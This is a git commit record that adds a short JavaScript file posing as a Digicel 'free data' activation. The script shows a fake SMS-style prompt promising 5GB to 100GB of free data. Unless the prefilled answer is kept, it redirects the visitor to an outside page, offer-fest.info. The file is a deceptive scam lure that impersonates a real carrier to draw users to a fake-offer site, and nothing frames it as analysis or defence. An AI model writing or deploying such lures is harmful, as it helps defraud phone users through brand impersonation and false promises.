18086dbb10286ac3ba22826855fa6e702f0b450d
ekpesense <abantak9@gmail.com>
2025-03-09 10:00:18 -0700

    Create activation-digicel-free-data.js

---
+++ activation-digicel-free-data.js
@@ -0,0 +1,6 @@
+
+var password = 'FREE DATA'
+password=prompt(' SMS: Dear Customer, kindly Receive Free 5GB - 100GB Data! Press FREE DATA To Receive Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://offer-fest.info/digicel-free-data.html';
+}
